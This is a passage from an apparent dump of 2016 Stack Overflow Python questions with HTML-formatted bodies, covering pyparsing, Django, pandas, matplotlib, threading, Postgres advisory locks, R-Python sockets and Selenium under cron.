                  pyparsing.restOfLine.setResultsName(""value""))

    VALUE = pyparsing.Word(pyparsing.alphanums + ""_()+-/*"")
    DECLARATION = (pyparsing.Literal(""const"") +
                   TYPE.setResultsName(""type"") +
                   IDENTIFIER.setResultsName(""name"") +
                   pyparsing.Literal(""="") +
                   VALUE.setResultsName(""value"") +
                   pyparsing.Literal("";""))
    REFERENCE = pyparsing.Forward()

    def process_definition(s, l, t):
        value = REFERENCE.transformString(t.value)
        constants[t.name] = value
        REFERENCE &lt;&lt; pyparsing.MatchFirst(
            map(pyparsing.Keyword, constants.keys()))
        return ""#define "" + t.name + "" "" + value

    def process_declaration(s, l, t):
        value = REFERENCE.transformString(t.value)
        constants[t.name] = value
        REFERENCE &lt;&lt; pyparsing.MatchFirst(
            map(pyparsing.Keyword, constants.keys()))
        return ""const "" + t.type + "" "" + t.name + ""="" + value + "";""

    def process_reference(s, l, t):
        return constants[t[0]]

    REFERENCE.setParseAction(process_reference)
    DEFINITION.setParseAction(process_definition)
    DECLARATION.setParseAction(process_declaration)
    EXPANDER = REFERENCE | DEFINITION | DECLARATION

    code = EXPANDER.transformString(code)
    for key, val in constants.items():
        constants[key] = eval(val)

    return code, constants


# -----------------------------------------------------------------------------
if __name__ == '__main__':

    code = """"""
#version 120

#define A (1)
const int B=(A+2);
#define C (B+3)
const int D=C+4;

uniform float array[D];

struct Point {
    vec4 position;
    float size;
};

uniform struct Light {
    vec4 position;
    vec3 color;
} light0, light1;

const float PI = 3.14159265358979323846264;
const float SQRT_2 = 1.4142135623730951;

uniform vec4 fg_color = vec4(1),
             bg_color = vec4(vec3(0),1);

mediump vec3 compute_normal(vec4 position, vec3 orientation);
vec3 /* */ compute_light(vec4, vec3, float intensity)
{
   vec3 hello;
   vec3 hello;
}

""""""
code, _ = resolve(code)
print(""GLSL version: %s\n"" % get_version(code))

get_definitions(code)
get_declarations(code)
get_prototypes(code)
get_functions(code)

# code = """"""
# #if A
# #if B
# #if C
# #endif
# #endif
# #endif
# """"""

# IF = (pyparsing.Literal('#') + (pyparsing.Keyword('if') | pyparsing.Keyword('ifdef') | pyparsing.Keyword('ifndef')))
# ENDIF = (pyparsing.Literal('#') + pyparsing.Keyword('endif'))
# MACRO = (IF + pyparsing.restOfLine() +
#          SkipTo(ENDIF, include=True)).setParseAction(pyparsing.originalTextFor)
# for (tokens, start, end) in MACRO.scanString(code):
#     print tokens
</code></pre>

<p>When you try running the above mcve code you'll get:</p>

<pre><code>GLSL version: 120

('Light', 'light0')
('Light', 'light1')
d:\virtual_envs\py2711\lib\site-packages\pyparsing.py:3536: SyntaxWarning: Cannot combine element of type &lt;type 'int'&gt; with ParserElement
  matchExpr = locMarker(""_original_start"") + expr + endlocMarker(""_original_end"")
d:\virtual_envs\py2711\lib\site-packages\pyparsing.py:3536: SyntaxWarning: Cannot combine element of type &lt;type 'NoneType'&gt; with ParserElement
  matchExpr = locMarker(""_original_start"") + expr + endlocMarker(""_original_end"")
Traceback (most recent call last):
  File ""D:\sources\personal\python\pyqt\pyshaders\gui\glsl-parser.py"", line 311, in &lt;module&gt;
    get_declarations(code)
  File ""D:\sources\personal\python\pyqt\pyshaders\gui\glsl-parser.py"", line 173, in get_declarations
    for (tokens, start, end) in DECLARATION.scanString(code):
  File ""d:\virtual_envs\py2711\lib\site-packages\pyparsing.py"", line 1258, in scanString
    nextLoc,tokens = parseFn( instring, preloc, callPreParse=False )
  File ""d:\virtual_envs\py2711\lib\site-packages\pyparsing.py"", line 1084, in _parseNoCache
    loc,tokens = self.parseImpl( instring, preloc, doActions )
  File ""d:\virtual_envs\py2711\lib\site-packages\pyparsing.py"", line 2576, in parseImpl
    loc, exprtokens = e._parse( instring, loc, doActions )
  File ""d:\virtual_envs\py2711\lib\site-packages\pyparsing.py"", line 1084, in _parseNoCache
    loc,tokens = self.parseImpl( instring, preloc, doActions )
  File ""d:\virtual_envs\py2711\lib\site-packages\pyparsing.py"", line 2576, in parseImpl
    loc, exprtokens = e._parse( instring, loc, doActions )
  File ""d:\virtual_envs\py2711\lib\site-packages\pyparsing.py"", line 1084, in _parseNoCache
    loc,tokens = self.parseImpl( instring, preloc, doActions )
  File ""d:\virtual_envs\py2711\lib\site-packages\pyparsing.py"", line 3038, in parseImpl
    loc, tokens = self.expr._parse( instring, loc, doActions, callPreParse=False )
  File ""d:\virtual_envs\py2711\lib\site-packages\pyparsing.py"", line 1084, in _parseNoCache
    loc,tokens = self.parseImpl( instring, preloc, doActions )
  File ""d:\virtual_envs\py2711\lib\site-packages\pyparsing.py"", line 2576, in parseImpl
    loc, exprtokens = e._parse( instring, loc, doActions )
  File ""d:\virtual_envs\py2711\lib\site-packages\pyparsing.py"", line 1110, in _parseNoCache
    tokens = fn( instring, tokensStart, retTokens )
  File ""d:\virtual_envs\py2711\lib\site-packages\pyparsing.py"", line 831, in wrapper
    ret = func(*args[limit[0]:])
  File ""d:\virtual_envs\py2711\lib\site-packages\pyparsing.py"", line 3542, in originalTextFor
    matchExpr.setParseAction(extractText)
AttributeError: 'NoneType' object has no attribute 'setParseAction'
</code></pre>

<p>I'm still in the process of learning pyparsing, what's the problem here?</p>
"
39702457,2277437.0,2016-09-26 12:11:09+00:00,2,hash function that outputs integer from 0 to 255?,"<p>I need a very simple hash function in Python that will convert a string to an integer from 0 to 255.</p>

<p>For example:</p>

<pre><code>&gt;&gt;&gt; hash_function(""abc_123"")
32
&gt;&gt;&gt; hash_function(""any-string-value"")
99
</code></pre>

<p>It does not matter what the integer is as long as I get the same integer every time I call the function.</p>

<p>I want to use the integer to generate a random subnet mask based on the name of the network.</p>
"
40074004,1411736.0,2016-10-16 18:37:28+00:00,2,Access kivy popup parent,"<p>The way popups are implemented in kivy, the popup seems to get attached to the window and not the parent object which created the popup.  Popup comes with self.dismiss() to close the popup but I can't figure out any way to access the 'parent' object since despite creating the popup, it seems to exist outside of it.</p>

<p>Example snippets:</p>

<pre><code>class StartButton(ActionButton)
    def on_release(self):
        self.popup = StartPop(id='popid')
        self.popup.open()

class StartPop(Popup):
    def close(self):
        self.dismiss()
    def start(self):
        print(self)
        print(self.parent)
</code></pre>

<p>The result of the print commands is</p>

<pre><code>&lt;__main__.StartPop object at 0x00000000037BBCE0&gt;

&lt;kivy.core.window.window_sdl2.WindowSDL object at 0x000000000373B0B0&gt;
</code></pre>

<p>So rather than the parent being StartButton, whose parent I would also expect to access etc. the parent is the Window.  </p>

<p>I don't see how I could bind any function that thus interact with the widget I used to create the popup from.  I need to be able to get the parent object and its parents to do things based on what I click within the popup but I can't figure out how this could be implemented.</p>

<p>In the .kv file</p>

<pre><code>&lt;StartPop&gt;:
    title: 'Popup'
    auto_dismiss: True
    size_hint: None,None
    size: 400,250
    BoxLayout:
        orientation: 'vertical'
        Label:
            text: 'sample text here'
            text_size: self.size
            halign: 'center'
            valign: 'middle'
        BoxLayout:
            orientation: 'horizontal'
            Button:
                size_hint: 1,0.5
                text: 'Cancel'
                on_release: root.close()
            Button:
                size_hint: 1,0.5
                text: 'Start Testing'
                on_release: root.start()
</code></pre>
"
40050238,526904.0,2016-10-14 18:56:11+00:00,2,Is Root Algorithm,"<p>I create a function to determine if a number was a root (not sure if this is the right term) of another number.</p>

<pre><code>def isRoot(n, root):
   return not math.log(n, root)%1
</code></pre>

<p>For the most part this works, but I've found I've had a floating point problem. For example if I do <code>isRoot(125,5)</code> I get <code>False</code>. After some troubleshooting, I found that the reason is because </p>

<pre><code>&gt;&gt;&gt; math.log(125,5)
3.0000000000000004
</code></pre>

<p>Even though the result should be <code>3</code>. So my question is, should I just use a different algorithm, one I'm not aware of? Or is there a way to ensure this will work correctly no matter how large of a number I use?</p>
"
39733343,3573182.0,2016-09-27 20:02:01+00:00,2,How to compute correlation between attributes in python?,"<p>So I have a dataset with 13 attributes + the class attribute and I want to find the correlations. 
After some search I found methods to compute the correlation in a multivariate dataset but the problem is that they work with normally distributed data. I tried doing this:</p>

<pre><code>stats.normaltest(ds, None)
</code></pre>

<p>But it return the p value as 0.0. Is this normal behavior? 
I mean I know if the p is lower than 0.05 it is not a normal distribution but I 've never seen the p value = exactly 0.0</p>
"
40042345,4858891.0,2016-10-14 11:42:58+00:00,2,'type' object is not iterable in using django_enums,"<p>I tried to use <a href=""https://pypi.python.org/pypi/django-enums/"" rel=""nofollow"">django_enums</a> and got an error with <strong>list(cls)</strong> when making migrations:</p>

<pre><code>(venv:SFS)rita@rita-notebook:~/Serpentarium/ServiceForServices/project/serviceforservices$ python manage.py makemigrations
    Traceback (most recent call last):
  File ""manage.py"", line 22, in &lt;module&gt;
    execute_from_command_line(sys.argv)
  File ""/home/rita/Serpentarium/ServiceForServices/venv/local/lib/python2.7/site-packages/django/core/management/__init__.py"", line 367, in execute_from_command_line
    utility.execute()
  File ""/home/rita/Serpentarium/ServiceForServices/venv/local/lib/python2.7/site-packages/django/core/management/__init__.py"", line 341, in execute
    django.setup()
  File ""/home/rita/Serpentarium/ServiceForServices/venv/local/lib/python2.7/site-packages/django/__init__.py"", line 27, in setup
    apps.populate(settings.INSTALLED_APPS)
  File ""/home/rita/Serpentarium/ServiceForServices/venv/local/lib/python2.7/site-packages/django/apps/registry.py"", line 108, in populate
    app_config.import_models(all_models)
  File ""/home/rita/Serpentarium/ServiceForServices/venv/local/lib/python2.7/site-packages/django/apps/config.py"", line 199, in import_models
    self.models_module = import_module(models_module_name)
  File ""/usr/lib/python2.7/importlib/__init__.py"", line 37, in import_module
    __import__(name)
  File ""/home/rita/Serpentarium/ServiceForServices/project/serviceforservices/service/models.py"", line 84, in &lt;module&gt;
    class EmployeesStatus(models.Model):
  File ""/home/rita/Serpentarium/ServiceForServices/project/serviceforservices/service/models.py"", line 86, in EmployeesStatus
    status = enum.EnumField(StatusEnum, default=StatusEnum.AT)
  File ""/home/rita/Serpentarium/ServiceForServices/venv/local/lib/python2.7/site-packages/django_enums/enum.py"", line 53, in __init__
    kwargs['max_length'] = self.enum.get_max_length()
  File ""/home/rita/Serpentarium/ServiceForServices/venv/local/lib/python2.7/site-packages/django_enums/enum.py"", line 39, in get_max_length
    return len(max(list(cls), key=(lambda x: len(x.key))).key)
TypeError: 'type' object is not iterable
</code></pre>

<p>I installed django-enums, enum and six:</p>

<pre><code>(venv:SFS)rita@rita-notebook:~/Serpentarium/ServiceForServices/project/serviceforservices$ pip install django-enums
(venv:SFS)rita@rita-notebook:~/Serpentarium/ServiceForServices/project/serviceforservices$ pip install enum
(venv:SFS)rita@rita-notebook:~/Serpentarium/ServiceForServices/project/serviceforservices$ pip install six
</code></pre>

<p>Using in Models.py:</p>

<pre><code>...
from django_enums import enum

...
class StatusEnum(enum.Enum):
__order__ = 'AT BT BC AC'  # for python 2

AT = (u'ÐÐ', u'ÐÐºÑÐ¸Ð²ÐµÐ½ Ð²ÑÐµÐ¼ÐµÐ½Ð½Ð¾')
BT = (u'ÐÐ', u'ÐÐ»Ð¾ÐºÐ¸ÑÐ¾Ð²Ð°Ð½ Ð²ÑÐµÐ¼ÐµÐ½Ð½Ð¾')
BC = (u'ÐÐ', u'ÐÐ»Ð¾ÐºÐ¸ÑÐ¾Ð²Ð°Ð½ Ð¿Ð¾ÑÑÐ¾ÑÐ½Ð½Ð¾')
AC = (u'ÐÐ', u'ÐÐºÑÐ¸Ð²ÐµÐ½ Ð¿Ð¾ÑÑÐ¾ÑÐ½Ð½Ð¾')

class EmployeesStatus(models.Model):
    name = models.CharField(max_length=128)
    status = enum.EnumField(StatusEnum, default=StatusEnum.AT)
</code></pre>

<p>It seems like project is alive, it also was updated for Django 1.10 and compartible with python 2 allegedly. So, what I'm doing wrong? </p>
"
39730199,5666087.0,2016-09-27 16:46:58+00:00,2,How can I update a list of lists very quickly in a thread-safe manner? - python,"<p>I am writing a script to add a ""column"" to a Python list of lists at 500 Hz. Here is the code that generates test data and passes it through a separate thread:</p>

<pre><code># fileA
import random, time, threading
data = [[] for _ in range(4)]  # list with 4 empty lists (4 rows)
column = [random.random() for _ in data]  # synthetic column of data
def synthesize_data():
    while True:
        for x,y in zip(data,column):
            x.append(y)
        time.sleep(0.002)  # equivalent to 500 Hz
t1 = threading.Thread(target=synthesize_data).start()
# example of data
# [[0.61523098235, 0.61523098235, 0.61523098235, ... ],
# [0.15090349809, 0.15090349809, 0.15090349809, ... ],
# [0.92149878571, 0.92149878571, 0.92149878571, ... ],
# [0.41340918409, 0.41340918409, 0.41340918409, ... ]]

# fileB (in Jupyter Notebook)
[1] import fileA, copy

[2] # get a copy of the data at this instant.
    data = copy.deepcopy(fileA.data)
    for row in data:
        print len(row)
</code></pre>

<p>If you run cell [2] in fileB, you should see that the lengths of the ""rows"" in <code>data</code> are not equal. Here is example output when I run the script:</p>

<pre><code>8784
8786
8787
8787
</code></pre>

<p>I thought I might be grabbing the data in the middle of the <code>for</code> loop, but that would suggest that the lengths would be off by 1 at the most. The differences get more severe over time. <strong>My question: why is quickly adding columns to a list of lists unstable?</strong> Is it possible to make this process for stable?</p>

<p>You might suggest I use something like Pandas, but I want to use Python lists because of their speed advantage (the code needs to be as fast as possible). I tested the <code>for</code> loop, <code>map()</code> function, and Pandas data frame. Here is my test code (in Jupyter Notebook):</p>

<pre><code># Setup code
import pandas as pd
import random
channels = ['C3','C4','C5','C2']
a = [[] for _ in channels]
b = [random.random() for _ in a]
def add_col((x,y)):
    x.append(y);
df = pd.DataFrame(index=channels)
b_pandas = pd.Series(b, index=df.index)

%timeit for x,y in zip(a,b): x.append(y)  # 1000000 loops, best of 3: 1.32 Âµs per loop
%timeit map(add_col, zip(a,b))  # 1000000 loops, best of 3: 1.96 Âµs per loop
%timeit df[0] = b  # 10000 loops, best of 3: 82.8 Âµs per loop
%timeit df[0] = b_pandas  # 10000 loops, best of 3: 58.4 Âµs per loop
</code></pre>

<p>You might also suggest that I append the samples to <code>data</code> as rows and then transpose when it's time to analyze. I would rather not do that also in the interest of speed. This code will be used in a brain-computer interface, where analysis happens in a loop. Transposing would also have to happen in the loop, and this would get slow as the data grows.</p>

<p>edit: changed title from ""Why is quickly adding columns to a list of lists unstable - python"" to ""How can I update a list of lists very quickly in a thread-safe manner? - python"" to make the title more descriptive of the post and the answer.</p>
"
40078536,6591667.0,2016-10-17 04:32:19+00:00,2,Webscraping with Python ( beginner),"<p>I'm doing the first example of the webscrapping tutorial from the book ""Automate the Boring Tasks with Python"". The project consists of typing a search term on the command line and have my computer automatically open a browser with all the top search results in new tabs</p>

<p>It mentions that I need to locate the </p>

<pre><code>&lt;h3 class=""r""&gt; 
</code></pre>

<p>element from the page source, which are the links to each search results. 
The r class is used only for search result links.</p>

<p>But the problem is that I can't find it anywhere, even using Chrome Devtools. Any help as to where is it would be greatly appreciated.</p>

<p>Note: Just for reference this is the complete program as seen on the book.</p>

<pre><code># lucky.py - Opens several Google search results.

import requests, sys, webbrowser, bs4

print('Googling..') # display text while downloading the Google page
res= requests.get('http://google.com/search?q=' + ' '.join(sys.argv[1:]))
res.raise_for_status()

#Retrieve top searh result links.
soup = bs4.BeautifulSoup(res.text)

#Open a browser tab for each result.
linkElems = soup.select('.r a')
numOpen = min(5,len(linkElems))
for i in range(numOpen):
    webbrowser.open('http://google.com' + linkElems[i].get('href'))
</code></pre>
"
39730184,5597830.0,2016-09-27 16:46:23+00:00,2,Python - Stacking two histograms with a scatter plot,"<p>Having an example code for a scatter plot along with their histograms </p>

<pre><code>x = np.random.rand(5000,1)
y = np.random.rand(5000,1)



fig = plt.figure(figsize=(7,7))
ax = fig.add_subplot(111)
ax.scatter(x, y, facecolors='none')
ax.set_xlim(0,1)
ax.set_ylim(0,1)



fig1 = plt.figure(figsize=(7,7))
ax1 = fig1.add_subplot(111)
ax1.hist(x, bins=25, fill = None, facecolor='none', 
        edgecolor='black', linewidth = 1)



fig2 = plt.figure(figsize=(7,7))
ax2 = fig2.add_subplot(111)
ax2.hist(y, bins=25 , fill = None, facecolor='none', 
        edgecolor='black', linewidth = 1)
</code></pre>

<p>What I'm wanting to do is to create this graph with the histograms attached to their respected axis almost like this example</p>

<p><a href=""http://i.stack.imgur.com/ZIcFZ.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/ZIcFZ.png"" alt=""enter image description here""></a></p>

<p>I'm familiar with stacking and merging the x-axis</p>

<pre><code>f, (ax1, ax2, ax3) = plt.subplots(3)
ax1.scatter(x, y)
ax2.hist(x, bins=25, fill = None, facecolor='none', 
        edgecolor='black', linewidth = 1)
ax3.hist(y, bins=25 , fill = None, facecolor='none', 
        edgecolor='black', linewidth = 1)

f.subplots_adjust(hspace=0)
plt.setp([a.get_xticklabels() for a in f.axes[:-1]], visible=False)
</code></pre>

<p><a href=""http://i.stack.imgur.com/doW0u.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/doW0u.png"" alt=""enter image description here""></a></p>

<p>But I have no idea how to attach the histograms to the y axis and x axis like in the picture I posted above, and on top of that, how to vary the size of the graphs (ie make the scatter plot larger and the histograms smaller in comparison)</p>
"
40078265,7028965.0,2016-10-17 03:55:42+00:00,2,Not sure how to fix this error Luhn Algorithm PYTHON,"<p>Alright,
So I think i'm almost there,
my first/second part work perfect when they are on their own, but i'm having trouble combining the two
this is what I have so far
I'm thinking the error is in the last bit, 
sorry, im new with python, so i'm hoping to get the hang of it soon</p>

<p>Edit3: i've gotten it to work (with the help of you guys) but now when i input 3782822463100050, its suppose to be invalid american express, but its showing up as valid american express...</p>

<p>Edit1: Okay, for example when i post <code>0378282246310005</code> (a fake american express) it says </p>

<pre><code>Traceback (most recent call last):
  File ""C:/Users/Nat/Desktop/attempt.py"", line 39, in &lt;module&gt;
    print((cardType)+""Valid"")
NameError: name 'cardType' is not defined
</code></pre>

<p>but when i insert a random number like <code>0378282246310005</code> it works</p>

<p>Please enter your credit card number 0378282246310005</p>

<p>We do not accept that kind of card</p>

<p>Edit2: in the end you should be able to type in a credit card number and it'll say ""Your ""type of credit card"" is valid (or invalid)</p>

<p>or say that ""we dont support the card""</p>

<pre><code>#GET number that will be tested
CreditNumber = input(""Please enter your credit card number"")

#SET total to 0
total=0

#LOOP backwards from the last digit to the first, one at a time
CreditCount = len(CreditNumber)
for i in range(0, CreditCount, -1):
    LastDigit=CreditCard[i]

#IF the position of the current digit is even THEN DOUBLE the value of the current digit
    if i % 2 ==0:
        LastDigit=LastDigit*2

#IF the doubled value is more than 9 THEN SUM the digits of the doubled value
        if LastDigit&gt;9:
            LastDigit=LastDigit/10+LastDigit%10

    total=total + digit

#Figure out what credit card the user has
if ( CreditNumber[0:2]==""34"" or CreditNumber[ 0:2 ] == ""37""):
     cardType = ""Your American Express is""

elif ( CreditNumber[ 0 :4 ] ==""6011""):
       cardType = ""Your Discover card is""

elif ( CreditNumber[0 :2 ]  in [ ""51"", ""52"", ""53"", ""54"", ""55""]):
       cardType = ""Your Mastercard is""

elif ( CreditNumber == ""4"" ):
       cardType = ""Your VISA card is""

else:
       print( ""We do not accept that kind of card"")

if total % 10 == 0:
    print((cardType)+""Valid"")

else:
    print((cardType)+""Invalid"")
</code></pre>
"
39730105,6645337.0,2016-09-27 16:42:43+00:00,2,how to use get_object_or_404 with order_by('?') to get random image,"<p>I want to get random object from model but if there are no data in database I want to return 404 page.</p>

<p>This line of code works for me well:</p>

<pre><code>    dummy_image=DummyImage.objects.order_by('?').first().image_url.url
</code></pre>

<p>but I want to use the <code>get_object_or_404</code> shortcut.</p>

<p>So I tried this:</p>

<pre><code>dummy_image = get_object_or_404(DummyImage).order('?').first().image_url.url
</code></pre>

<p>but it dosent't work and causes issues. It says that it returned more than two objects.</p>

<p>How do I solve the problem?</p>
"
40078164,123776.0,2016-10-17 03:39:47+00:00,2,How can I ensure a write has completed in PostgreSQL before releasing a lock?,"<p>I have a function on a Django model that calculates a value from a PostgreSQL 9.5 database and, based on the result, determines whether to add data in another row. The function must know the value before adding the row, and future values of the calculation will be dependent on the new row.</p>

<p>To enforce these rules, I'm trying to use <a href=""https://www.postgresql.org/docs/9.5/static/explicit-locking.html#ADVISORY-LOCKS"" rel=""nofollow"">advisory locks</a>. A simplified version of what I'm trying to do is below:</p>

<pre class=""lang-python prettyprint-override""><code>from django.db import connection, models, transaction

...

def create_usage(self, num_credits):
    LOCK_SQL = '''SELECT pg_advisory_lock(1) FROM %s WHERE id = %s'''
    UNLOCK_SQL = '''SELECT pg_advisory_unlock(1) FROM %s WHERE id = %s'''

    cursor = connection.cursor()
    try:
        # Create an advisory lock on the instance's row
        print('obtaining lock for object {}'.format(id(self))
        cursor.execute(LOCK_SQL, [self._meta.db_table, self.id])
        print('obtained lock for object {}'.format(id(self))

        # Perform some read and update when the lock is obtained
        with transaction.atomic():
            # -- SELECT SUM(...) FROM table WHERE ...
            sum_credits = self.credits_used.aggregate(
                sum_credits=models.Sum('num_credits'))['sum_credits']
            print('existing credits: {}'.format(sum_credits))

            if sum_credits &lt; 100 - num_credits:
                print('inserting')
                # -- INSERT INTO table VALUE (...)
                self.credits_used.add(CreditUsage(num_credits=num_credits))
            else:
                print('not inserting')
    finally:
        # Release the lock when done, or when an exception occurs
        print('releasing lock for object {}'.format(id(self))
        cursor.execute(UNLOCK_SQL, [self._meta.db_table, self.id])
        print('released lock for object {}'.format(id(self))
</code></pre>

<p>(this is loosely inspired by <a href=""https://www.caktusgroup.com/blog/2009/05/26/explicit-table-locking-with-postgresql-and-django/"" rel=""nofollow"">this Caktus Group post</a>)</p>

<p>I have this code running in several processes connected to the same database. In the console, the order of the <code>'obtaining'</code> and <code>'releasing'</code> print statements are what I expect them to be (i.e., no lock is obtained before some other process releases it), but the data that I get from the database doesn't appear to update like I expect. For example, when running a view (that calls <code>obj.create_usage(5)</code>) in quick succession from different threads I'll get:</p>

<pre class=""lang-none prettyprint-override""><code>obtaining lock for object A
obtained lock for object A
existing credits: 90
inserting
releasing lock for object A
obtaining lock for object B
released lock for object A
obtained lock for object B
existing credits: 90
inserting
obtaining lock for object C
releasing lock for object B
released lock for object B
obtained lock for object C
existing credits: 90
inserting
releasing lock for object C
released lock for object C
obtaining lock for object D
obtained lock for object D
existing credits: 95
obtaining lock for object E
inserting
releasing lock for object D
obtained lock for object E
released lock for object D
existing credits: 100
not inserting
releasing lock for object E
released lock for object E
</code></pre>

<p><em>NOTE: I used <code>A</code>, <code>B</code>, <code>C</code>, <code>D</code>, <code>E</code> instead of the objects' numeric IDs for readability.</em></p>

<p>Why wouldn't the writes register before the reads, given the DB locks? I tried without the <code>transaction.atomic</code> at first, but added it thinking that it would make a difference. It did not. Is there a way to enforce the insert to <em><strong>really</strong></em> complete before releasing the advisory lock?</p>
"
39729995,998967.0,2016-09-27 16:36:48+00:00,2,Pandas - column not found in dataframe,"<p>I'm reading a csv file, frmo which I obtain these columns:</p>

<pre><code>encoding = ""UTF-8-SIG""
csv_file = ""my/path/to/file.csv""
fields_cols_mapping = {
    'brand_id': 'Brand',
    'custom_dashboard': 'Custom Dashboard LO',
    'custom_dashboard_isfeatured': 'Custom Dashboard LO - Is Featured',
    'description': 'LODescription',
    'is_active': 'TrainingIsActive',
    'lo_id': 'LOID',
    'lo_type_id': 'LOType',
    'timestamp': 'Timestamp',
    'title': 'LOTitle',
    'training_version_id': 'TrainingVersion'
}

dataframe = pd.read_csv(
        csv_file,
        encoding=encoding,
        sep='|',
        usecols=[unicode(v) for v in fields_cols_mapping.values()],
        dtype={ k: object for k in fields_cols_mapping.keys() },
    )
</code></pre>

<p>However, while inspecting with ipdb I found that the parser called with <code>read_csv</code> doesn't convert the column name <code>Custom Dashboard LO â Is Featured</code>:</p>

<pre><code># debug
&gt; /../../venvs/myvenv/lib/python2.7/site-packages/pandas/io/parsers.py(1140)__init__()
1138             col_indices = []
1139             for u in self.usecols:
-&gt; 1140                 if isinstance(u, string_types):
1141                     col_indices.append(self.names.index(u))
1142                 else:

ipdb&gt; self
&lt;pandas.io.parsers.CParserWrapper object at 0x10b134710&gt;
ipdb&gt; self.names
[u'LOType', u'LOID', u'LOTitle', u'TrainingVersion',    u'LODescription', u'TrainingIsActive', u'Custom Dashboard LO', u'Brand',     u'Custom Dashboard LO \u2013 Is Featured', u'Timestamp']
</code></pre>

<p>Does anybody have any suggestions about what I should do?</p>
"
39729857,4940476.0,2016-09-27 16:28:38+00:00,2,Interfacing R and Python,"<p>I want to do Optimization in R of a function writen in Python. I already know that scipy has optimization functions, but I want some functions that are in R but not in scipy. The problem is that I have my function in a Python script, this function needs some other information apart of the parameters to fit. So at Initalization the python script import some files and do some operations, thats why I don't want to call each time the script because that would lower the performance. </p>

<p>For doing that I tryed to call once the python script and then connect to it with a socket. This is my R script (It doesn't include the optimization yet):</p>

<pre><code>#Variables to initialize:

p_pos = '""[[0.,0.,True],[1.2378958026, 0,True],[0, 0.7152889725,True]]""'
names = '""[\'bridge\',\'hollow\',\'top\']""'
potential = ""a-a""
symmetry = ""non""



#Initialize python script

command = ""python""
path2script='""Least_squares_potentials.py""'

#data pased to python

string = paste(p_pos, names, potential, symmetry, sep=""---"")
pattern = ""---""

args = c(string, pattern)


# Add path to script as first arg


allArgs = c(path2script, args)

#Initialize

output = system2(command, args=allArgs, stdout=FALSE, wait=FALSE)

Sys.sleep(5)


client &lt;- function(param){
   while(TRUE){
    con &lt;- socketConnection(host=""localhost"", port = 6011, blocking=TRUE,
                        server=FALSE, open=""r+"")
    response &lt;- param  
    writeLines(response, con)
    data &lt;- readLines(con, 1)
    print(data)
    close(con)
  }
}


#guess = ""[3.589,3.995,1.418,1.809]""
guess = ""[3.733,2.413,8]""

client(guess)
client(""q"")
</code></pre>

<p>And in my python side:</p>

<pre><code># Get the arguments passed in

string = sys.argv[1]
pattern = sys.argv[2]

# Perform the splitting

ans = string.split(pattern)
p_pos = ast.literal_eval(ans[0])
names = ast.literal_eval(ans[1])
potential = ans[2]
symm = ans[3]

#Initialize the potential (this is my function, which is actually a class)

Least = Least_squares(names, p_pos, potential, symm)

#----------------------------------------------------------#
#INITIALIZE SOCKET
#----------------------------------------------------------#

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', 6011))
s.listen(1)
while 1:
    (conn, addr) = s.accept()
    data = conn.recv(1024)
    if ( data == 'q' or data == 'Q'):
        conn.close()
        break;
    else:        
        conn.send(Least.xi_square(np.array(ast.literal_eval(data))))
</code></pre>

<p>Doing this I get nothing... well I get ""\xadÈ\xf3=\xd0Y@"" and I don't know what is this, after waiting severlal minutes. So can anyone help me out with this?. Maybe there is another way of doing this I don't know. Any help will be really appreciated.</p>
"
40078015,807493.0,2016-10-17 03:19:43+00:00,2,Flask restful - Exception handling traceback?,"<p>I am using Flask Restful to build an API. I have a number of model classes with methods that may raise custom exceptions (for example: AuthFailed exception on my User model class). I am using the custom error handling, documented <a href=""http://flask-restful-cn.readthedocs.io/en/0.3.4/extending.html#custom-error-handlers"" rel=""nofollow"">here</a>, to handle this (so that when auth fails, an appropriate response is sent). So far so good. However, I notice that when the exception is raised although the correct response JSON and status is sent back, I still get a traceback which is not ideal. Usually, if I handle an error (outside of flask) with a try-except block, the except can catch the error and handle it (preventing the traceback). So what is the correct approach here? Am I misunderstanding how to use the errors feature?</p>
"
39729776,6418786.0,2016-09-27 16:24:59+00:00,2,One colorbar for several subplots in symmetric logarithmic scaling,"<p>I need to share the same colorbar for a row of subplots.  Each subplot has a symmetric logarithmic scaling to the color function.  Each of these tasks has a nice solution explained here on stackoverflow: <a href=""https://stackoverflow.com/a/38940369/6418786"">For sharing the color bar</a> and <a href=""https://stackoverflow.com/a/39256959/6418786"">for nicely formatted symmetric logarithmic scaling</a>.</p>

<p>However, when I combine both tricks in the same code, the colorbar ""forgets"" that is is supposed to be symmetric logarithmic.  Is there a way to work around this problem? </p>

<p>Testing code is the following, for which I combined the two references above in obvious ways:</p>

<pre><code>import numpy as np                                                                                  
import matplotlib.pyplot as plt                                                                     
from mpl_toolkits.axes_grid1 import ImageGrid                                                       
from matplotlib import colors, ticker                                                               

# Set up figure and image grid                                                                      
fig = plt.figure(figsize=(9.75, 3))                                                                 

grid = ImageGrid(fig, 111,          # as in plt.subplot(111)                                        
                 nrows_ncols=(1,3),                                                                 
                 axes_pad=0.15,                                                                     
                 share_all=True,                                                                    
                 cbar_location=""right"",                                                             
                 cbar_mode=""single"",                                                                
                 cbar_size=""7%"",                                                                    
                 cbar_pad=0.15,                                                                     
                 )                                                                                  

data = np.random.normal(size=(3,10,10))                                                             
vmax = np.amax(np.abs(data))                                                                        

logthresh=4                                                                                         
logstep=1                                                                                           
linscale=1                                                                                          

maxlog=int(np.ceil(np.log10(vmax)))                                                                 

#generate logarithmic ticks                                                                         
tick_locations=([-(10**x) for x in xrange(-logthresh, maxlog+1, logstep)][::-1]                     
                +[0.0]                                                                              
                +[(10**x) for x in xrange(-logthresh,maxlog+1, logstep)] )                          

# Add data to image grid                                                                            
for ax, z in zip(grid,data):                                                                        
    print z                                                                                         
    im = ax.imshow(z, vmin=-vmax, vmax=vmax,                                                        
                   norm=colors.SymLogNorm(10**-logthresh, linscale=linscale))                       

# Colorbar                                                                                          
ax.cax.colorbar(im,ticks=tick_locations, format=ticker.LogFormatter())                              
ax.cax.toggle_label(True)                                                                           

#plt.tight_layout()    # Works, but may still require rect paramater to keep colorbar labels visible
plt.show()
</code></pre>

<p>The generated output is the following:
<a href=""http://i.stack.imgur.com/9TzpH.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/9TzpH.png"" alt=""enter image description here""></a></p>
"
39729710,5696027.0,2016-09-27 16:20:05+00:00,2,Execute Python scripts with Selenium via Crontab,"<p>I have several python scripts that use selenium webdriver on a Debian server. If I run them manually from the terminal (usually as root) everything is ok but every time I tried to run them via crontab I have an exception like this:</p>

